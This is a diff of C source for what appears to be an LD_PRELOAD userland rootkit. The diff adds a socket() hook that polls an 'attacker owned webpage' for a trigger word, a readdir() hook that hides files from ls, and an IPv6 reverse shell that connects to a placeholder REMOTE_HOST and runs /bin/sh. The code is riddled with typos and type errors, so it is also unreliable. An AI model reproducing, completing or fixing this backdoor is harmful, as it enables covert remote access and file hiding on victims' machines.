@@ -1,3 +1,4 @@
+#include <arpa/inet.h>
 #include <stdio.h>
 #include <unistd.h>
 #include <dlfcn.h>
@@ -9,22 +10,29 @@
 #include <dirent.h>
 #include <arpa/inet.h>
 #include <netdb.h>
-#include <regex.h> 
+#include <regex.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <sys/types.h>
+#define REMOTE_HOST 
+#define REMOTE_PORT
+#define BIND_PORT 
+#define ATTACKER_WEBSITE
 
-
-/*overwrite write syscall to check website for triggerword*/
+/*overwrite socket syscall to check website for triggerword*/
 int socket(int domain, int type, int protocol){
 	int (*new_socket)(int domain, int type, int protocol);
 
 	new_socket=dlysm(RTLD_NEXT, "socket");
 	connect();
 }
+
 /*looks for keyword in attcker owned webpage which will trigger a connection (use pastebin or some google site) */
 int connect(void)
 {
 
 	int port_num = 80;
-	char *host = "127.0.0.1";
+	char *host = ATTACKER_WEBSITE;
 	char *message_fmt ="GET /home\r\n\r\n";
 
 	struct hostent *server;
@@ -84,7 +92,7 @@ int connect(void)
 
 
 
-//hook write
+/*hook write */
 	ssize_t write(int fildes, const void *buf, size_t nbytes)
 	{
     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);
@@ -94,40 +102,60 @@ int connect(void)
     new_write = dlsym(RTLD_NEXT, "write");
 	}	
 
+/*hook readdir() to hide from ls*/
+static struct dirent *(*old_readdir)(DIR * dir);
+readdir(DIR * dirp)
+{
+	struct dirent *dir;
+	int num = dlsym(RTLD_LAZY, "readdir");
+	while(dir =old_readdir(dirp))
+	{
+		if((dir=NULL) && !(strcmp(dir->d_name, ".\0"))
+			break;
+	}
+	return dir;
 
-/*ipv6 reverse shell to avoid detection */
+}
 
-void ipv6(void)
+/*ipv6 bind shell*/
+
+/*ipv6 reverse shell */
+int ipv6(void)
 {
 	//imagine hardcoding your IP address
 
 	char[] ip_address = "127.0.0.1";
 
+	int s= socket(AF_INET6, SOCK_STREAM, 0);
 
 
 	//create socket address
 
-	struct sockaddr_in6 host_socket;
-	int s= socket(AF_INET6, SOCK_STREAM, 0);
+	struct sockaddr_in6 host_port;
 	host_socket.sin6_family = AF_INET6;
-	host_socket.sin6_port = htons(5000);
-	host_socket.sin6_addr.sin6_addr = ip_address;
+	host_socket.sin6_port = htons(REMOTE_PORT);
+	host_socket.sin6_addr.sin6_addr = REMOTE_HOST;
 
-	bind(s, (struct) sockaddr_in6 *)&host_socket, sizeof(host_socket));
-	listen(s, 5);
+	//get current IP address
+	struct ifreq ifr;
+	ifr.ifr_addr.sa_family = AF_INET6;
+	iotctl(s, SIOCGIFADDR, &ifr);
 
-	 while (1) {
-        c = accept(s, NULL, NULL);
-        pid = fork();
-        if (pid == -1) {
-            exit(1);
-        } else if (pid == 0) {
-            close(s);
-            handle_client(c);
-            close(c);
-            return 0;
-        } else {
-            close(c);
-            waitpid(pid, NULL, 0);
-        }
-    }
+
+	struct sockaddr_in6 client_port;
+	host_socket.sin6_family = AF_INET6;
+	host_socket.sin6_port = htons(BIND_PORT);
+	host_socket.sin6_addr.sin6_addr = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
+
+
+	bind(s, (struct sockaddr*)&client_port, sizeof(client_port));
+	connect(s,(struct) sockadd_in6*)&host_socket, sizeof(host_socket));
+
+	 exceve("/bin/sh", NULL, NULL);
+	 close(s);
+
+	  return 0;
+	}
+
+
+
